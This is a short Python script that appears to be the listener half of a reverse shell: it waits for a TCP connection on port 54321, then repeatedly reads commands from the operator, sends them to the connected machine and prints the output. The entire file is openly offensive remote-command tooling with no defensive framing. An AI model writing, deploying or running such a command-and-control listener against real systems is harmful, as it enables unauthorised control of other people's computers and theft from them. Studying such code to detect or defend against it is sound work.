import socket
from termcolor import colored

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", 54321))
s.listen(5)

print(colored("[+] Waiting for incoming connections...", "green"))
target, ip = s.accept()

print(colored(f"[+] Connection established from: {ip}", "green"))
s.close()

def shell():
	while True:
		command = input("Shell#~%s: " % str(ip))
		
		if command == 'q':
			target.send(command.encode())
			break
		
		target.send(command.encode())
		result = target.recv(1024).decode()
		print(result)

shell()
